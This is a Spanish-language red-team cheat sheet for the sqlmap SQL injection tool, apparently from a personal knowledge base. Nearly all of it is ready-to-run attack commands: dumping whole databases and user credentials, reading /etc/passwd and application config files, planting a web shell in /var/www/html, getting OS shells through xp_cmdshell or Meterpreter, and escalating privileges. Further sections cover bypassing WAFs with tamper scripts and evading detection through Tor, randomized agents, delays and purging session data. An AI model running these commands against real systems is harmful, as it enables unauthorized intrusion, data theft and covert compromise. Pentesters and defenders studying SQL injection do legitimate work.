---
aliases:
  - SQLmap
tags:
  - technique/execution
  - vuln/sqli
  - asset/web-app
  - tool/sqlmap
primary categories:
  - '[[Red Team]]'
secondary categories:
  - '[[Explotación]]'
  - "[[Web]]"
tertiary categories:
  - '[[Web Explotación]]'
kind: CheatSheet
linked:
  - '[[SQL Injection (SQLi)]]'
---
# sqlmap

***

## Cheatsheet
^sqlmap-cheatsheet

| Fase | Comando |
| --- | --- |
| **Test básico** | `sqlmap -u "http://target/page?id=1" --batch` |
| **POST data** | `sqlmap -u "http://target/login" --data "user=admin&pass=x" --batch` |
| **From Burp request** | `sqlmap -r request.txt --batch` |
| **Cookie-based** | `sqlmap -u "http://target/" --cookie "PHPSESSID=x" --level=3` |
| **Param específico** | `sqlmap -u "http://target/?id=1&q=x" -p id` |
| **DBs** | `sqlmap -u URL --dbs` |
| **Tables** | `sqlmap -u URL -D dbname --tables` |
| **Dump table** | `sqlmap -u URL -D db -T users --dump` |
| **Dump all** | `sqlmap -u URL --dump-all` |
| **OS shell** | `sqlmap -u URL --os-shell` |
| **SQL shell** | `sqlmap -u URL --sql-shell` |
| **File read** | `sqlmap -u URL --file-read=/etc/passwd` |
| **File write** | `sqlmap -u URL --file-write=shell.php --file-dest=/var/www/html/s.php` |

***

## Flags esenciales

### Input
```bash
-u "URL"                    # URL target
-r request.txt              # Request Burp/ZAP exportado
-g "google dork"            # Google dork inurl
-l proxylog.log             # Burp/WebScarab log
-m urls.txt                 # Multiple URLs
--data "k=v&k=v"            # POST body
--cookie "c=v"              # Cookies
--headers="X-Forwarded-For:x" # Custom headers
--user-agent "custom"       # UA
--random-agent              # UA random
--referer "http://x"        # Referer
--method=POST               # HTTP method
-p param1,param2            # Solo testear estos params
--skip=param                # Skip
```

### Niveles de agresividad
```bash
--level=1   # default (low)
--level=5   # exhaustive (cookies, headers, etc.)
--risk=1    # default (safe payloads)
--risk=3    # incluye UPDATE, OR-based, time-based heavy
```

Subir ambos (`--level=5 --risk=3`) para targets difíciles.

### Detección
```bash
--technique=BEUSTQ   # B=bool, E=err, U=union, S=stacked, T=time, Q=inline
--dbms=mysql         # Asumir DBMS (salta fingerprint)
--os=linux           # OS conocido
--prefix "'" --suffix "-- -"  # Payload wrapping
--tamper=space2comment  # Tamper scripts para bypass WAF
```

### Enum DB
```bash
--current-user --current-db --hostname --is-dba
--users --passwords --privileges --roles
--dbs                                 # Listar DBs
-D db --tables                        # Tablas de db
-D db -T users --columns              # Columnas
-D db -T users -C user,pass --dump    # Dump específico
--dump-all --exclude-sysdbs           # Dump todo excepto system DBs
--search -T "pass"                    # Search por nombre de table/column
--schema                              # Schema completo
```

### Post-exploitation
```bash
--os-shell                # Shell OS (requiere FPU/LOAD_FILE permissions)
--os-cmd "whoami"         # Comando único
--os-pwn                  # Meterpreter upload (requiere msfconsole)
--file-read=/etc/passwd
--file-write=local.php --file-dest=/var/www/html/s.php
--sql-shell               # SQL interactivo
--sql-query "SELECT version()"
--reg-read --reg-key=HKLM\Software\Key --reg-value=Val  # Windows registry
--priv-esc                # UDF exploit MySQL/PostgreSQL
```

## Tamper scripts (bypass WAF / filtros)

```bash
--list-tampers  # Ver disponibles

# Comunes:
--tamper=space2comment           # espacios → /**/
--tamper=space2plus              # espacios → +
--tamper=space2mssqlblank        # MSSQL-specific
--tamper=charencode              # URL-encode
--tamper=randomcase              # SeLeCt → random case
--tamper=apostrophenullencode    # %00 en quotes
--tamper=between                 # >= → NOT BETWEEN 0 AND
--tamper=equaltolike             # = → LIKE
--tamper=concat2concatws         # MySQL concat bypass
--tamper=modsecurityversioned    # /*!50000UNION*/ bypass ModSecurity
--tamper=base64encode            # Base64 full payload
--tamper=unmagicquotes           # magic_quotes_gpc bypass

# Combinar múltiples
--tamper=space2comment,between,randomcase
```

## Técnicas detalladas

### Boolean-based blind
```bash
sqlmap -u URL --technique=B --string "Welcome"
```

### Error-based
```bash
sqlmap -u URL --technique=E
```

### Union-based
```bash
sqlmap -u URL --technique=U --union-cols=5
```

### Time-based blind
```bash
sqlmap -u URL --technique=T --time-sec=10
```

### Stacked queries (MSSQL/PostgreSQL)
```bash
sqlmap -u URL --technique=S
```

## Request construction

### Request file (from Burp)
En Burp → right-click sobre request → Copy to file → guardar como `request.txt`.

```bash
sqlmap -r request.txt --batch --level=3 --risk=2
```

Marcar param específico para inject:
```
GET /search?q=test* HTTP/1.1
```
El `*` marca el inject point — override del autodetect.

### JSON body
```bash
sqlmap -u "http://target/api/search" --method=POST --data='{"q":"test*"}' --headers="Content-Type: application/json"
```

### GraphQL
```bash
sqlmap -u "http://target/graphql" --method=POST --data='{"query":"{ user(id: \"1*\") { name } }"}' --headers="Content-Type: application/json"
```

### SOAP / XML
```bash
sqlmap -u "http://target/service" --method=POST --data='<soap><id>1*</id></soap>' --headers="Content-Type: text/xml; SOAPAction: "
```

## Evasion / stealth

```bash
--delay=2                # Segundos entre requests
--timeout=30             # Timeout por request
--retries=3              # Reintentos
--randomize=id           # Random value en param
--safe-url=http://x/safe # Pinea URL segura cada N requests
--safe-freq=3            # Cada cuántos
--proxy=http://127.0.0.1:8080     # Via Burp
--proxy-cred=user:pass
--tor                    # Usar Tor
--tor-type=SOCKS5
--tor-port=9050
--check-tor              # Verificar Tor antes
--ignore-code=401        # Ignorar status HTTP
--force-ssl              # Forzar HTTPS
```

## Output / resumen

```bash
--output-dir=./output     # Guardar todo aquí
-v 3                      # Verbosity 0-6
--fresh-queries           # No usar cache de sesión
--flush-session           # Borrar session previa
--purge                   # Borrar todo data de sqlmap
--answers="follow=Y"      # Auto-responder prompts
--batch                   # Default all prompts
```

## Chains comunes

### Detect → Enum → Dump
```bash
# 1. Detect
sqlmap -r req.txt --batch

# 2. DBs
sqlmap -r req.txt --batch --dbs

# 3. Tables de DB target
sqlmap -r req.txt --batch -D appdb --tables

# 4. Dump sensibles
sqlmap -r req.txt --batch -D appdb -T users -C user,password,email --dump

# 5. Dump masivo (exclude system)
sqlmap -r req.txt --batch --dump-all --exclude-sysdbs
```

### SQLi → OS shell
```bash
sqlmap -r req.txt --batch --os-shell
# Seleccionar web writable directory → /var/www/html
# → shell via webshell plantada
```

### SQLi → File read de config
```bash
sqlmap -r req.txt --batch --file-read=/etc/passwd
sqlmap -r req.txt --batch --file-read=/var/www/html/config.php
sqlmap -r req.txt --batch --file-read=C:/xampp/htdocs/db.php
```

### Stacked queries + xp_cmdshell (MSSQL)
```bash
sqlmap -u URL --technique=S --os-shell --os=windows --dbms=mssql
# Habilita xp_cmdshell si disabled → shell
```

## OpSec

- `--random-agent` + `--delay` para evadir rate limits.
- `--tamper` chain contra WAF.
- `--tor` para routing anónimo.
- `--proxy=http://127.0.0.1:8080` para review via Burp.
- `--output-dir` separado para cada target.
- `--purge` al terminar para limpiar cache.

## Recursos

- [sqlmap docs](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- [sqlmap tampers](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
- [HackTricks - SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [[SQL Injection (SQLi)]] — hub conceptual.

***
